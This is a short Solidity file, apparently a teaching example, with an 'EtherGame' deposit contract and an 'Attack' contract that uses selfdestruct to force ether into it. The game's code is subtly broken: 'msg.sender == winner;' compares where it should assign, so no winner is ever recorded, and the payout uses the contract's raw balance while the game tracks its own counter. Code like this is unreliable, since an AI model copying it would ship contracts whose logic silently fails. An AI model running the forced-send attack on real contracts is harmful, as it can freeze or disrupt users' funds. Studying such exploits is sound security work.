// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract EtherGame
{
    uint public targetAmount = 7 ether;
    address public winner;
    uint public balance;
    function deposit() public payable 
    {
        require (msg.value == 1 ether, "You can only send 1 ether");
        balance += msg.value;
        require(balance <= targetAmount, "Game is over");
        if (balance == targetAmount)
        {
            msg.sender == winner;   
        } 
    }
    function claimReward() public
    {
        require (msg.sender == winner, "Not Winner");
        (bool sent,) = msg.sender.call {value: address(this).balance}("");
        require (sent, "Failed to send ether");
    }
    function getBalance() public view returns (uint)
    {
        return address(this).balance;
    }

}

contract Attack
{
    EtherGame ethergame;
    constructor (EtherGame _ethergame)
    {
        ethergame = EtherGame(_ethergame);
    }

    function attack() public payable
    {
        address payable target = payable(address(ethergame));
        selfdestruct(target);
    }
}